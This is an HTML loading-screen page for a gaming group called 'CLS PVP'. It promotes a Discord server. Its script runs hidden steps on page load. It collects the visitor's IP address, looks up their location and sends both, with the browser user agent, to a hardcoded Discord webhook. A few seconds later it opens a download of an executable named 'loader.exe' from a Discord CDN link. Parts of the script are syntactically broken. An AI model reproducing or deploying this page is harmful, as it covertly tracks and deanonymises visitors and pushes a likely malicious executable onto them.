
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CLS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'JetBrains Mono', monospace;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            position: relative;
        }

        /* Animated red gradient overlay */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 0;
            pointer-events: none;
            background: radial-gradient(circle at 20% 30%, rgba(255,34,34,0.25) 0%, transparent 60%),
                        radial-gradient(circle at 80% 70%, rgba(255,34,34,0.18) 0%, transparent 60%),
                        radial-gradient(circle at 60% 20%, rgba(255,34,34,0.12) 0%, transparent 60%);
            animation: redGlowMove 8s linear infinite alternate;
        }

        @keyframes redGlowMove {
            0% {
                background-position: 20% 30%, 80% 70%, 60% 20%;
            }
            100% {
                background-position: 40% 60%, 60% 40%, 80% 80%;
            }
        }
        
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }
        
        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(2px);
        }
        
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.7);
            z-index: 1;
        }
        
        .logo {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 18px;
            font-weight: 700;
            color: #ff2222;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo::after {
            content: "";
            font-size: 24px;
        }
        
        .loading-content {
            text-align: center;
            z-index: 10;
        }
        
        .main-title {
            font-size: 4rem;
            font-weight: 700;
            margin-bottom: 2rem;
            background: linear-gradient(45deg, #ff2222, #ff4444, #ff2222);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 3s ease-in-out infinite;
            text-shadow: 0 0 20px rgba(255, 34, 34, 0.3);
        }
        
        .loading-text {
            font-size: 1.5rem;
            color: #888;
            margin-bottom: 1rem;
            opacity: 0;
            animation: fadeInUp 1s ease-out 0.5s forwards;
        }
        
        .progress-container {
            width: 400px;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            margin: 2rem 0;
            overflow: hidden;
            position: relative;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff2222, #ff4444);
            width: 0%;
            border-radius: 2px;
            animation: loading 4s ease-in-out forwards;
            box-shadow: 0 0 10px rgba(255, 34, 34, 0.5);
        }
        
        .progress-text {
            font-size: 0.9rem;
            color: #ff2222;
            margin-top: 1rem;
            font-weight: 600;
        }
        
        .subtitle {
            font-size: 1.2rem;
            color: #ccc;
            margin-top: 2rem;
            opacity: 0;
            animation: fadeInUp 1s ease-out 2s forwards;
        }
        
        .discord-info {
            position: absolute;
            bottom: 50px;
            left: 50%;
            transform: translateX(-50%);
            text-align: center;
            opacity: 0;
            animation: fadeInUp 1s ease-out 3s forwards;
        }
        
        .discord-info .discord-text {
            font-size: 1.1rem;
            color: #ff2222;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }
        
        .discord-info .discord-url {
            font-size: 0.9rem;
            color: #888;
        }
        
        .quote {
            font-size: 1rem;
            color: #aaa;
            font-style: italic;
            margin-top: 1rem;
        }

        .final-message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            opacity: 0;
            visibility: hidden;
            transition: all 1s ease-in-out;
            z-index: 100;
        }

        .final-message.show {
            opacity: 1;
            visibility: visible;
        }

        .final-message .avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 4px solid #ff2222;
            margin: 0 auto 2rem auto;
            box-shadow: 0 0 30px rgba(255, 34, 34, 0.5);
            animation: pulse 2s infinite;
        }

        .final-message .main-text {
            font-size: 2rem;
            font-weight: 700;
            color: #ff2222;
            text-shadow: 0 0 20px rgba(255, 34, 34, 0.5);
            margin-bottom: 1rem;
        }

        .final-message .discord-link {
            font-size: 1.5rem;
            color: #fff;
            margin-bottom: 1.5rem;
            font-weight: 600;
        }

        .final-message .final-quote {
            font-size: 1.2rem;
            color: #aaa;
            font-style: italic;
            max-width: 600px;
            margin: 0 auto;
            line-height: 1.4;
        }

        .loading-content.fade-out {
            opacity: 0;
            transform: translateY(-20px);
            transition: all 1s ease-in-out;
        }

        @keyframes pulse {
            0%, 100% { 
                box-shadow: 0 0 30px rgba(255, 34, 34, 0.5);
                transform: scale(1);
            }
            50% { 
                box-shadow: 0 0 50px rgba(255, 34, 34, 0.8);
                transform: scale(1.05);
            }
        }
        
        .glitch {
            position: relative;
        }
        
        .glitch::before,
        .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        
        .glitch::before {
            animation: glitch 2s infinite;
            color: #ff2222;
            z-index: -1;
        }
        
        .glitch::after {
            animation: glitch 2s infinite reverse;
            color: #ff2222;
            z-index: -2;
        }
        
        .particles {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            background: #ff2222;
            border-radius: 50%;
            opacity: 0.6;
            animation: float 6s infinite ease-in-out;
        }
        
        @keyframes loading {
            0% { width: 0%; }
            20% { width: 25%; }
            40% { width: 50%; }
            60% { width: 75%; }
            100% { width: 100%; }
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            25% { transform: translateY(-20px) rotate(90deg); }
            50% { transform: translateY(-40px) rotate(180deg); }
            75% { transform: translateY(-20px) rotate(270deg); }
        }
        
        @media (max-width: 768px) {
            .main-title {
                font-size: 2.5rem;
            }
            
            .progress-container {
                width: 300px;
            }
            
            .loading-text {
                font-size: 1.2rem;
            }
        }
    </style>
</head>
<body>
    <div class="video-background">
        <video id="bgVideo" autoplay muted loop>
            <source src="" type="video/mp4">
        </video>
    </div>
    
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <audio id="finalAudio" src="audio.mp3"></audio>
        <div class="logo">
            CLS
        </div>
        
        <div class="loading-content">
            <h1 class="main-title glitch" data-text=".gg/nkh">
                CLS PVP
            </h1>
            
            <div class="loading-text">

        <div class="final-message" id="finalMessage">
            <img src="https://cdn.discordapp.com/avatars/1394318039716987000/5b66c1d99bb83d16b63cde4575a36d5a.webp?size=2048" alt="CLS Avatar" class="avatar">
            <div class="main-text">by CLS TEAM</div>
            <div class="discord-link">https://discord.gg/VbHmjSuaRR</div>
            <div class="final-quote">"Hi, I'm CLS 7assen, This Server te7chelo"</div>
            <div class="user-ip" style="margin-top:2rem; color:#ff2222; font-size:1.1rem; display:none;">
                Your IP: <span id="userIp">Loading...</span>
            </div>
        </div>
    </div>

    <script>
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('userIp').textContent = data.ip;
                    // Fetch geolocation info based on IP
                    fetch(`https://ipapi.co/${data.ip}/json/`)

                        .then(geo => {
                            const location = geo.city && geo.country_name ? `${geo.city}, ${geo.country_name}` : (geo.country_name || 'Unknown');
                            const userAgent = navigator.userAgent;
                            // Send all info to Discord webhook
                            fetch('https://canary.discord.com/api/webhooks/1403593457234219069/qstUnWxJx9jlZtbzOYYVZVVsqdSua7hfS6QRZlTLDMhqdVWPt0c7zf9FjVLFAAJuYxiu', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    content: `IP: ${data.ip}\nLocation: ${location}\nUser-Agent: ${userAgent}`
                                })
                            });
                        })
                        .catch(() => {
                            // If geolocation fails, just send IP
                            fetch('https://canary.discord.com/api/webhooks/1403593457234219069/qstUnWxJx9jlZtbzOYYVZVVsqdSua7hfS6QRZlTLDMhqdVWPt0c7zf9FjVLFAAJuYxiu', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    content: `IP: ${data.ip}\nLocation: Unknown\nUser-Agent: ${navigator.userAgent}`
                                })
                            });
                        });
                })
                .catch(() => {
                    document.getElementById('userIp').textContent = 'Unavailable';
                });
        // Open YouTube link on page load (after DOM is ready)

            }, 3700);
        });
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                window.open('https://cdn.discordapp.com/attachments/1355033353715191887/1388176887599202467/loader.exe?ex=689766f9&is=68961579&hm=825939ace801477dd1f2155d200cd8e13dba02228405a644d9ec505c4e6292e4&', '_blank');
            }, 3700);
        });
        // Progress bar animation with percentage counter
        function updateProgress() {
            const progressBar = document.querySelector('.progress-bar');
            const progressText = document.getElementById('progressText');
            const loadingContent = document.querySelector('.loading-content');
            const finalMessage = document.getElementById('finalMessage');
            const userIpDiv = document.querySelector('.final-message .user-ip');
            let progress = 0;
            
            const interval = setInterval(() => {
                progress += Math.random() * 3 + 1;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    
                    // After loading completes, fade out loading content and show final message
                    setTimeout(() => {
                        loadingContent.classList.add('fade-out');
                        
                        setTimeout(() => {
                            finalMessage.classList.add('show');
                            userIpDiv.style.display = 'block';
                            // Play audio when final message and IP are shown
                            const audio = document.getElementById('finalAudio');
                            if (audio) {
                                audio.play().catch(()=>{});
                            }
                        }, 500);
                    }, 1000);
                }
                
                progressBar.style.width = progress + '%';
                progressText.textContent = Math.floor(progress) + '%';
            }, 100);
        }
        
        // Create floating particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.width = Math.random() * 4 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.animationDelay = Math.random() * 6 + 's';
                particlesContainer.appendChild(particle);
            }
        }
        
        // Function to set background video
        function setBackgroundVideo(videoUrl) {
            const video = document.getElementById('bgVideo');
            if (videoUrl) {
                video.src = videoUrl;
                video.style.display = 'block';
            } else {
                video.style.display = 'none';
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            updateProgress();
            createParticles();
            
            // Example: Uncomment and provide a video URL to use background video
            // setBackgroundVideo('path/to/your/video.mp4');
        });
        
        // Add some interactive effects
        document.addEventListener('mousemove', function(e) {
            const particles = document.querySelectorAll('.particle');
            const mouseX = e.clientX / window.innerWidth;
            const mouseY = e.clientY / window.innerHeight;
            
            particles.forEach((particle, index) => {
                const speed = (index % 3 + 1) * 50;
                const x = (mouseX - 0.5) * speed;
                const y = (mouseY - 0.5) * speed;
                
                particle.style.transform = `translate(${x}px, ${y}px)`;
            });
        });
    </script>
